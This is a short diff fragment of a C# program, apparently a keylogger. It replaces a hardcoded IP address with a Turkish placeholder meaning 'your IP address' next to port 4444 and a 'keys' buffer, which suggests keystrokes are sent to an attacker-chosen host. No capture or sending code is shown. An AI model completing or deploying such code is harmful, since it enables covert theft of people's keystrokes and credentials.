@@ -11,7 +11,7 @@ using System.Runtime.InteropServices;
 
 class Program
 {
-    private static string host = "192.168.0.16";
+    private static string host = "SİZİN_İP_ADRESİNİZ";
     private static int port = 4444;
     private static StringBuilder keys = 
         new StringBuilder();
